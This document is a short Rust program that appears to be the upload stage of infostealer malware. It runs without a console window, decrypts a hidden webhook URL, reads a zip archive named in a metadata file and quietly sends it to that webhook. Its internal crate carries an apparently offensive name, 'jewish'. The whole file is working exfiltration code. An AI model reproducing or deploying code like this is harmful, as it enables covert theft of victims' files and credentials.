#![windows_subsystem = "windows"]

use jewish::encrypted::decrypt_webhook;
use jewish::sender::{send_to_webhook, DeliveryMeta};

#[tokio::main]
async fn main() -> Result<(), Box<dyn std::error::Error>> {
    let args: Vec<String> = std::env::args().collect();
    if args.len() < 2 {
        return Ok(());
    }

    let meta_path = &args[1];
    let meta_json = std::fs::read_to_string(meta_path)?;
    let meta: DeliveryMeta = serde_json::from_str(&meta_json)?;

    let wbh = decrypt_webhook().unwrap_or_default();
    if wbh.is_empty() {
        return Ok(());
    }

    let zip_data = std::fs::read(&meta.zip_path)?;

    let client = reqwest::Client::builder()
        .timeout(std::time::Duration::from_secs(120))
        .connect_timeout(std::time::Duration::from_secs(15))
        .build()
        .unwrap_or_else(|_| reqwest::Client::new());

    let _ = send_to_webhook(&client, &wbh, meta.embeds, zip_data, meta.zip_name).await;

    Ok(())
}
